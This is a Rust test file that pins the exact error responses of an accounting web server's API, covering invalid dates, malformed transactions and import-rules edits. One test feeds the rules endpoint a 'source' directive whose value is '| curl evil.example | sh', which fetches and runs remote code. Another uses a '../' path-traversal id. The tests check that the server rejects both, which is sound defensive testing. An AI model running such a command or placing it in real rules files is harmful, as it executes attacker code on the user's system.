//! The `/api/*` ERROR surface, pinned: status + `Content-Type` + exact body.
//!
//! # Why this exists
//!
//! The success bodies of the native wire are byte-pinned by
//! `native_wire_golden.rs` against `fixtures/native/v1/`. The ERROR bodies had
//! no equivalent, and they are just as much a contract:
//!
//! `web/src/lib/api/native.ts` (`mutate`) reads the write path's error body with
//! `response.text()` and hands the **verbatim plain text** to
//! `ValidationError` / `NotFoundError` / `ConflictError` /
//! `NativeApiUnavailableError`, whose `.message` the setup modal and the edit
//! popup show to the user. So for these responses:
//!
//!   * the STATUS selects which error class the SPA throws,
//!   * the `Content-Type` must stay `text/plain` — a JSON body would be
//!     surfaced to the user as a raw `{"code":…}` blob, because nothing on the
//!     SPA side parses it,
//!   * the BODY TEXT *is* the user-facing sentence.
//!
//! Refactoring the Rust side's error plumbing (DRY-4: one `AppError` with an
//! `IntoResponse` impl, replacing two ad-hoc `type ApiError = (StatusCode,
//! String)` aliases) must therefore be invisible on the wire. This file is the
//! proof: it was written against the PRE-refactor server, passed unchanged
//! against the POST-refactor one, and fails loudly if anyone later changes a
//! status, a media type, or a word of the copy without meaning to.
//!
//! Every case below is reachable from the SPA with ordinary use.

mod common;

use axum::body::Body;
use axum::http::{Request, StatusCode, header};
use common::{fixture_journal, fixture_journal_path};
use http_body_util::BodyExt;
use ledgeline_server::{AppState, app, router_with_state};
use serde_json::{Value, json};
use tower::ServiceExt;

/// What a client actually observes for a failed request.
#[derive(Debug, PartialEq, Eq)]
struct ErrorResponse {
    status: StatusCode,
    content_type: String,
    body: String,
}

/// Axum renders `(StatusCode, String)` — and so must anything that replaces it
/// — with exactly this media type. The SPA depends on it being text.
const PLAIN_TEXT: &str = "text/plain; charset=utf-8";

async fn send(router: axum::Router, method: &str, uri: &str, body: Option<Value>) -> ErrorResponse {
    let builder = Request::builder().method(method).uri(uri);
    let request = match body {
        Some(value) => builder
            .header(header::CONTENT_TYPE, "application/json")
            .body(Body::from(serde_json::to_vec(&value).expect("serialize")))
            .expect("request builds"),
        None => builder.body(Body::empty()).expect("request builds"),
    };
    let response = router.oneshot(request).await.expect("router responds");
    let status = response.status();
    let content_type = response
        .headers()
        .get(header::CONTENT_TYPE)
        .and_then(|value| value.to_str().ok())
        .unwrap_or("<absent>")
        .to_string();
    let body = String::from_utf8(
        response
            .into_body()
            .collect()
            .await
            .expect("body collects")
            .to_bytes()
            .to_vec(),
    )
    .expect("body is UTF-8");
    ErrorResponse {
        status,
        content_type,
        body,
    }
}

/// A read-only router (no editor bound) over `fixtures/sample.journal`.
async fn read_only(method: &str, uri: &str, body: Option<Value>) -> ErrorResponse {
    send(app(&fixture_journal()), method, uri, body).await
}

/// An EDITING-ENABLED router over a temp copy of the sample journal, so the
/// write path reaches the editor instead of short-circuiting on "not enabled".
fn editing_state() -> AppState {
    // A path per CALL, not per process. Ten tests in this binary call this, the
    // harness runs them on parallel threads of ONE process, and `fs::copy`
    // truncates before it writes -- so a pid-keyed name has one test rebuilding
    // the journal another test is mid-way through opening. That raced roughly
    // once in twenty full-suite runs and never in isolation, which is the worst
    // way for a test to be wrong. `rules_state` below already does this.
    static SEQ: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);
    let seq = SEQ.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
    let dir = std::env::temp_dir().join("ledgeline-error-surface-tests");
    std::fs::create_dir_all(&dir).expect("temp dir");
    let path = dir.join(format!("errors-{}-{seq}.journal", std::process::id()));
    std::fs::copy(fixture_journal_path(), &path).expect("copy sample journal");
    AppState::from_journal_path(&path).expect("editor opens")
}

async fn editing(method: &str, uri: &str, body: Option<Value>) -> ErrorResponse {
    send(router_with_state(editing_state()), method, uri, body).await
}

fn expect(status: StatusCode, body: &str) -> ErrorResponse {
    ErrorResponse {
        status,
        content_type: PLAIN_TEXT.to_string(),
        body: body.to_string(),
    }
}

// ---------------------------------------------------------------------------
// Read path — query-parameter validation (RPT-4 / SEC-2 / HOLD-3)
// ---------------------------------------------------------------------------

/// A date that is SHAPED like a date but is not one. Must name the field, echo
/// the value, and say why — the message is the whole diagnostic.
#[tokio::test]
async fn bad_date_is_a_400_naming_the_field_and_the_reason() {
    assert_eq!(
        read_only("GET", "/api/reports/balancesheet?asOf=2026-02-30", None).await,
        expect(
            StatusCode::BAD_REQUEST,
            "invalid asOf date '2026-02-30': month 02 of 2026 has no day 30 (it has 28)",
        )
    );
}

/// An explicit EMPTY date used to sort below every real date and serve an empty
/// report with a `200`.
#[tokio::test]
async fn empty_date_is_a_400_not_an_empty_report() {
    assert_eq!(
        read_only("GET", "/api/reports/balancesheet?asOf=", None).await,
        expect(
            StatusCode::BAD_REQUEST,
            "invalid asOf date '': expected YYYY-MM-DD (a four-digit year, then month and day, \
             separated by `-`, `/` or `.`)",
        )
    );
}

#[tokio::test]
async fn bad_interval_is_a_400_listing_the_accepted_values() {
    assert_eq!(
        read_only(
            "GET",
            "/api/reports/cashflow?end=2026-06-30&interval=hourly",
            None
        )
        .await,
        expect(
            StatusCode::BAD_REQUEST,
            "unknown interval 'hourly' (expected daily|weekly|monthly|quarterly|yearly)",
        )
    );
}

/// `count=0` reached `Vec::with_capacity` and aborted the request with a
/// `capacity overflow` panic (SEC-2). It rejects rather than clamps.
#[tokio::test]
async fn bad_count_is_a_400_stating_the_accepted_range() {
    assert_eq!(
        read_only("GET", "/api/reports/cashflow?end=2026-06-30&count=0", None).await,
        expect(
            StatusCode::BAD_REQUEST,
            "count 0 is out of range (expected 1..=1200)",
        )
    );
}

/// A `count` serde itself refuses (negative) is a 400 from the extractor, with
/// a differently-worded body. Pinned because it is the same user-visible class.
#[tokio::test]
async fn negative_count_is_rejected_by_the_extractor() {
    let response = read_only("GET", "/api/reports/cashflow?end=2026-06-30&count=-1", None).await;
    assert_eq!(response.status, StatusCode::BAD_REQUEST);
    assert_eq!(response.content_type, PLAIN_TEXT);
    assert!(
        response.body.contains("invalid digit"),
        "unexpected body: {}",
        response.body
    );
}

/// HOLD-3: a `valueIn` that prices nothing in scope would otherwise answer with
/// an all-zero portfolio and one `unpriced` warning per row.
#[tokio::test]
async fn unpriceable_value_in_is_a_400_explaining_the_missing_route() {
    assert_eq!(
        read_only("GET", "/api/holdings?asOf=2026-06-30&valueIn=ZZZ", None).await,
        expect(
            StatusCode::BAD_REQUEST,
            "cannot value these holdings in 'ZZZ': no price directive or cost annotation connects \
             any holding in scope to it",
        )
    );
}

#[tokio::test]
async fn bad_holdings_mode_is_a_400() {
    assert_eq!(
        read_only("GET", "/api/holdings?asOf=2026-06-30&mode=sideways", None).await,
        expect(
            StatusCode::BAD_REQUEST,
            "unknown mode 'sideways' (expected include|exclude)",
        )
    );
}

/// `changeMin` decides which rows appear in the "biggest change" boxes, so an
/// unreadable value is refused rather than silently replaced by the $10 default.
#[tokio::test]
async fn bad_change_min_is_a_400_not_a_silent_default() {
    let response = read_only("GET", "/api/insights?end=2026-06-30&changeMin=%2410", None).await;
    assert_eq!(response.status, StatusCode::BAD_REQUEST);
    assert_eq!(response.content_type, PLAIN_TEXT);
    assert!(
        response.body.starts_with("invalid changeMin '$10': "),
        "unexpected body: {}",
        response.body
    );
}

// ---------------------------------------------------------------------------
// Write path — the bodies the SPA shows the user verbatim
// ---------------------------------------------------------------------------

/// A state with no backing file answers `501`, which the SPA maps to
/// `NativeApiUnavailableError` and the setup modal surfaces.
#[tokio::test]
async fn editing_disabled_is_a_501_with_the_reason() {
    let body = json!({
        "date": "2026-01-01",
        "postings": [{"account": "expenses:a", "amount": {"commodity": "$", "quantity": {"mantissa": "100", "places": 2}}},
                     {"account": "assets:bank"}],
    });
    assert_eq!(
        read_only("POST", "/api/transactions", Some(body)).await,
        expect(
            StatusCode::NOT_IMPLEMENTED,
            "editing is not enabled: this server was started without a journal file bound to an \
             editor",
        )
    );
}

/// DL-2: an unrecognized posting `type` must be a 400, never a silent fallback
/// to `regular` (which rewrote `[balanced-virtual]` postings as real ones).
#[tokio::test]
async fn unknown_posting_type_is_a_400_not_a_silent_regular() {
    let body = json!({
        "date": "2026-01-01",
        "postings": [
            {"account": "expenses:a", "type": "bogus",
             "amount": {"commodity": "$", "quantity": {"mantissa": "100", "places": 2}}},
            {"account": "assets:bank"},
        ],
    });
    let response = editing("POST", "/api/transactions", Some(body)).await;
    assert_eq!(response.status, StatusCode::BAD_REQUEST);
    assert_eq!(response.content_type, PLAIN_TEXT);
    assert!(
        response.body.starts_with("invalid request body: ")
            && response.body.contains("unknown variant `bogus`"),
        "unexpected body: {}",
        response.body
    );
}

/// A bare asserted number re-reads as whatever commodity the journal defaults
/// to, so a commodity-less assertion is refused at the boundary (DL-2).
#[tokio::test]
async fn malformed_balance_assertion_is_a_400_explaining_the_risk() {
    let body = json!({
        "date": "2026-01-01",
        "postings": [
            {"account": "assets:bank",
             "amount": {"commodity": "$", "quantity": {"mantissa": "100", "places": 2}},
             "balanceAssertion": {"amount": {"commodity": "  ", "quantity": {"mantissa": "9900", "places": 2}}}},
            {"account": "expenses:a"},
        ],
    });
    assert_eq!(
        editing("POST", "/api/transactions", Some(body)).await,
        expect(
            StatusCode::BAD_REQUEST,
            "the balance assertion on 'assets:bank' needs a commodity: a bare asserted number \
             would re-read as whatever commodity the journal defaults to",
        )
    );
}

/// An assertion on the elided leg would be dropped by the formatter — the
/// silent loss DL-2 is about.
#[tokio::test]
async fn assertion_on_the_elided_leg_is_a_400() {
    let body = json!({
        "date": "2026-01-01",
        "postings": [
            {"account": "expenses:a",
             "amount": {"commodity": "$", "quantity": {"mantissa": "100", "places": 2}}},
            {"account": "assets:bank",
             "balanceAssertion": {"amount": {"commodity": "$", "quantity": {"mantissa": "9900", "places": 2}}}},
        ],
    });
    assert_eq!(
        editing("POST", "/api/transactions", Some(body)).await,
        expect(
            StatusCode::BAD_REQUEST,
            "the balance assertion on 'assets:bank' needs an amount on the same posting: an \
             assertion cannot be written on the inferred (elided) leg",
        )
    );
}

/// SEC-5: `places` beyond what the PARSER stores would commit an amount that
/// re-reading the journal could never reproduce.
#[tokio::test]
async fn out_of_range_places_is_a_400() {
    let body = json!({
        "date": "2026-01-01",
        "postings": [
            {"account": "expenses:a",
             "amount": {"commodity": "$", "quantity": {"mantissa": "0", "places": 65534}}},
            {"account": "assets:bank"},
        ],
    });
    let response = editing("POST", "/api/transactions", Some(body)).await;
    assert_eq!(response.status, StatusCode::BAD_REQUEST);
    assert_eq!(response.content_type, PLAIN_TEXT);
    assert!(
        response
            .body
            .starts_with("amount places 65534 is out of range"),
        "unexpected body: {}",
        response.body
    );
}

#[tokio::test]
async fn non_integer_mantissa_is_a_400() {
    let body = json!({
        "date": "2026-01-01",
        "postings": [
            {"account": "expenses:a",
             "amount": {"commodity": "$", "quantity": {"mantissa": "1.5", "places": 2}}},
            {"account": "assets:bank"},
        ],
    });
    assert_eq!(
        editing("POST", "/api/transactions", Some(body)).await,
        expect(
            StatusCode::BAD_REQUEST,
            "invalid amount mantissa '1.5': expected a base-10 integer string",
        )
    );
}

#[tokio::test]
async fn a_transaction_with_no_postings_is_a_400() {
    let body = json!({"date": "2026-01-01", "postings": []});
    assert_eq!(
        editing("POST", "/api/transactions", Some(body)).await,
        expect(
            StatusCode::BAD_REQUEST,
            "a transaction needs at least one posting",
        )
    );
}

/// The SPA maps this status to `NotFoundError` ("that transaction no longer
/// exists — refresh the journal").
#[tokio::test]
async fn deleting_a_missing_transaction_is_a_404() {
    assert_eq!(
        editing("DELETE", "/api/transactions/99999", None).await,
        expect(
            StatusCode::NOT_FOUND,
            "transaction #99999 not found in the journal",
        )
    );
}

#[tokio::test]
async fn patching_a_missing_transaction_is_a_404() {
    let body = json!({"description": "nope"});
    assert_eq!(
        editing("PATCH", "/api/transactions/99999", Some(body)).await,
        expect(
            StatusCode::NOT_FOUND,
            "transaction #99999 not found in the journal",
        )
    );
}

/// An unbalanced replace is rejected with the editor's own sentence, which the
/// edit popup shows.
#[tokio::test]
async fn an_unbalanced_transaction_is_a_400_from_the_editor() {
    let body = json!({
        "date": "2026-01-01",
        "postings": [
            {"account": "expenses:a", "amount": {"commodity": "$", "quantity": {"mantissa": "100", "places": 2}}},
            {"account": "assets:bank", "amount": {"commodity": "$", "quantity": {"mantissa": "-999", "places": 2}}},
        ],
    });
    assert_eq!(
        editing("POST", "/api/transactions", Some(body)).await,
        expect(StatusCode::BAD_REQUEST, "the transaction does not balance")
    );
}

// ---------------------------------------------------------------------------
// Import rules — the sentences the imports screen shows verbatim
//
// Every one of these is reachable by ordinary use: a stale tab, a file someone
// else saved first, a construct Ledgeline will not rewrite. The wording is the
// whole diagnostic, and `rules_api`'s security argument rests on several of
// them being IDENTICAL across causes — so they are pinned here, not just
// asserted to be non-empty.
// ---------------------------------------------------------------------------

/// One rules file, `id.rules`, beside a temp journal, with an editor bound.
fn rules_state(contents: &[u8]) -> AppState {
    static SEQ: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);
    let seq = SEQ.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
    let dir = std::env::temp_dir().join(format!(
        "ledgeline-error-surface-rules/{}-{seq}",
        std::process::id()
    ));
    let _ = std::fs::remove_dir_all(&dir);
    std::fs::create_dir_all(&dir).expect("temp dir");
    let journal = dir.join("main.journal");
    std::fs::copy(fixture_journal_path(), &journal).expect("copy sample journal");
    std::fs::write(dir.join("id.rules"), contents).expect("write rules file");
    AppState::from_journal_path(&journal).expect("editor opens")
}

const GOOD_RULES: &str = "skip 1\nfields date, description, amount\naccount1 assets:bank\n";

async fn rules(state: AppState, method: &str, uri: &str, body: Option<Value>) -> ErrorResponse {
    send(router_with_state(state), method, uri, body).await
}

/// The revision the current `id.rules` is at, so a test can send a VALID one and
/// have the request fail for the reason it is actually about.
async fn rules_revision(state: &AppState) -> String {
    let response = send(
        router_with_state(state.clone()),
        "GET",
        "/api/rules/id.rules",
        None,
    )
    .await;
    assert_eq!(response.status, StatusCode::OK, "{}", response.body);
    serde_json::from_str::<Value>(&response.body)
        .ok()
        .and_then(|doc| doc["revision"].as_str().map(str::to_string))
        .expect("a revision")
}

/// ONE sentence for every syntactic rejection, on purpose: the differences are
/// about the caller's own input, and spelling each out gives anyone probing the
/// route a finer-grained signal for nothing.
#[tokio::test]
async fn a_malformed_rules_id_is_a_400_describing_what_an_id_is() {
    assert_eq!(
        rules(
            rules_state(GOOD_RULES.as_bytes()),
            "GET",
            "/api/rules/../escape.rules",
            None
        )
        .await,
        expect(
            StatusCode::BAD_REQUEST,
            "\"../escape.rules\" is not a usable rules file id: an id is the file's path relative \
             to the journal directory, forward-slash separated, at most 9 plain components and \
             1024 bytes, and it must end in `.rules`",
        )
    );
}

/// Identical for every cause — not scanned, not there, skipped, refused — so the
/// route cannot be used to tell any of them apart. It names the caller's own id
/// and nothing else.
#[tokio::test]
async fn an_unresolvable_rules_id_is_a_404_naming_only_the_caller_s_own_id() {
    assert_eq!(
        rules(
            rules_state(GOOD_RULES.as_bytes()),
            "GET",
            "/api/rules/nope.rules",
            None
        )
        .await,
        expect(
            StatusCode::NOT_FOUND,
            "no rules file \"nope.rules\" is available beside this journal",
        )
    );
}

/// The `409` all three staleness checks share: the client's revision, the
/// re-read immediately before the write, and the inode identity. They mean the
/// same thing to the user and call for the same action.
#[tokio::test]
async fn a_stale_rules_revision_is_a_409_telling_the_user_what_to_do() {
    let body = json!({"revision": "0-0000000000000000", "items": []});
    assert_eq!(
        rules(
            rules_state(GOOD_RULES.as_bytes()),
            "PUT",
            "/api/rules/id.rules",
            Some(body)
        )
        .await,
        expect(
            StatusCode::CONFLICT,
            "\"id.rules\" changed on disk since you opened it, so nothing was written. Re-open it \
             and re-apply your edit.",
        )
    );
}

/// The rules `PUT` answers with the EDITOR's own sentence, not a second one, so
/// the setup modal says the same thing whichever write the user attempted.
#[tokio::test]
async fn saving_rules_with_no_editor_bound_is_the_same_501_sentence() {
    let body = json!({"revision": "x", "items": []});
    assert_eq!(
        read_only("PUT", "/api/rules/id.rules", Some(body)).await,
        expect(
            StatusCode::NOT_IMPLEMENTED,
            "editing is not enabled: this server was started without a journal file bound to an \
             editor",
        )
    );
}

/// The remote-code-execution guard, in the words the user sees. `source ... |
/// CMD` is a shell command `hledger import` runs, so nothing may author one.
#[tokio::test]
async fn writing_a_source_directive_is_a_400_explaining_the_shell() {
    let state = rules_state(GOOD_RULES.as_bytes());
    let revision = rules_revision(&state).await;
    let body = json!({
        "revision": revision,
        "items": [
            {"kind": "keep", "id": 0},
            {"kind": "keep", "id": 1},
            {"kind": "keep", "id": 2},
            {"kind": "directive", "name": "source", "value": "| curl evil.example | sh"},
        ],
    });
    assert_eq!(
        rules(state, "PUT", "/api/rules/id.rules", Some(body)).await,
        expect(
            StatusCode::BAD_REQUEST,
            "a new item may not be a `source` directive: `source` accepts a `| CMD` form that \
             hledger runs through the shell on import, and `archive` names a path it moves files \
             to. Both can be kept, moved or deleted, never written",
        )
    );
}

/// Omitting an item is never an implicit delete, and the message says how to
/// delete on purpose — because the alternative is a client bug that silently
/// truncates the user's rules file.
#[tokio::test]
async fn a_rules_plan_that_drops_an_item_is_a_400_that_says_how_to_delete() {
    let state = rules_state(GOOD_RULES.as_bytes());
    let revision = rules_revision(&state).await;
    let body = json!({"revision": revision, "items": [{"kind": "keep", "id": 0}]});
    assert_eq!(
        rules(state, "PUT", "/api/rules/id.rules", Some(body)).await,
        expect(
            StatusCode::BAD_REQUEST,
            "the document must list every item; missing: 1, 2. List them in \"delete\" to remove \
             them on purpose.",
        )
    );
}

/// A field name the parser does not recognize is refused at the boundary rather
/// than written into a file hledger would then reject.
#[tokio::test]
async fn an_unknown_rules_field_name_is_a_400() {
    let state = rules_state(GOOD_RULES.as_bytes());
    let revision = rules_revision(&state).await;
    let body = json!({
        "revision": revision,
        "items": [
            {"kind": "keep", "id": 0},
            {"kind": "keep", "id": 1},
            {"kind": "assignment", "id": 2, "field": "acount1", "value": "assets:bank"},
        ],
    });
    assert_eq!(
        rules(state, "PUT", "/api/rules/id.rules", Some(body)).await,
        expect(
            StatusCode::BAD_REQUEST,
            "\"acount1\" is not an hledger CSV rules field name",
        )
    );
}

#[tokio::test]
async fn an_unreadable_directive_value_is_a_400_naming_both_halves() {
    let state = rules_state(GOOD_RULES.as_bytes());
    let revision = rules_revision(&state).await;
    let body = json!({
        "revision": revision,
        "items": [
            {"kind": "directive", "id": 0, "name": "skip", "value": "not-a-number"},
            {"kind": "keep", "id": 1},
            {"kind": "keep", "id": 2},
        ],
    });
    assert_eq!(
        rules(state, "PUT", "/api/rules/id.rules", Some(body)).await,
        expect(
            StatusCode::BAD_REQUEST,
            "\"skip\" is not one of hledger's rules-file directives, or \"not-a-number\" is not a \
             value it can carry",
        )
    );
}

/// A value with a leading space would be written as `account1    x` and read
/// back as `x` — silently not the value that was asked for, and `verify` cannot
/// see it because the shape and the extent are exactly what the plan requested.
/// Refusing loses nothing: hledger reads that run as the separator, so no rules
/// file can hold such a value.
#[tokio::test]
async fn an_assignment_value_with_a_leading_space_is_a_400_not_a_silent_trim() {
    let state = rules_state(GOOD_RULES.as_bytes());
    let revision = rules_revision(&state).await;
    let body = json!({
        "revision": revision,
        "items": [
            {"kind": "keep", "id": 0},
            {"kind": "keep", "id": 1},
            {"kind": "assignment", "id": 2, "field": "account1", "value": "   assets:bank"},
        ],
    });
    assert_eq!(
        rules(state, "PUT", "/api/rules/id.rules", Some(body)).await,
        expect(
            StatusCode::BAD_REQUEST,
            "an assignment value may not begin with a space or a tab: hledger reads that run as \
             the separator, so the value would be written and then read back without it",
        )
    );
}

/// A rules file the scan LISTS (so the user can see it) but cannot open for
/// editing. Failing closed matters: a lossy decode would write mojibake back
/// over the original.
#[tokio::test]
async fn a_non_utf8_rules_file_is_a_400_that_says_how_to_convert_it() {
    // Valid Latin-1, invalid UTF-8 — a `£` in an account name is enough.
    let latin1 = b"account1 assets:bank:\xa3\nfields date, amount\n";
    assert_eq!(
        rules(rules_state(latin1), "GET", "/api/rules/id.rules", None).await,
        expect(
            StatusCode::BAD_REQUEST,
            "\"id.rules\" is not valid UTF-8. Ledgeline reads and writes UTF-8 rules files only; \
             converting it first (e.g. `iconv -f latin1 -t utf-8`) is what keeps a character from \
             being silently rewritten.",
        )
    );
}

/// A malformed JSON body reaches the `JsonRejection` arm, which all three
/// body-taking handlers render identically.
#[tokio::test]
async fn a_malformed_json_body_is_a_400_on_every_body_taking_route() {
    for (method, uri) in [
        ("POST", "/api/transactions"),
        ("PUT", "/api/transactions/1"),
        ("PATCH", "/api/transactions/1"),
    ] {
        let request = Request::builder()
            .method(method)
            .uri(uri)
            .header(header::CONTENT_TYPE, "application/json")
            .body(Body::from("{not json"))
            .expect("request builds");
        let response = router_with_state(editing_state())
            .oneshot(request)
            .await
            .expect("router responds");
        let status = response.status();
        let content_type = response
            .headers()
            .get(header::CONTENT_TYPE)
            .and_then(|value| value.to_str().ok())
            .unwrap_or("<absent>")
            .to_string();
        let body = String::from_utf8(
            response
                .into_body()
                .collect()
                .await
                .expect("collects")
                .to_bytes()
                .to_vec(),
        )
        .expect("UTF-8");
        assert_eq!(status, StatusCode::BAD_REQUEST, "{method} {uri}");
        assert_eq!(content_type, PLAIN_TEXT, "{method} {uri}");
        assert!(
            body.starts_with("invalid request body: "),
            "{method} {uri}: unexpected body: {body}"
        );
    }
}
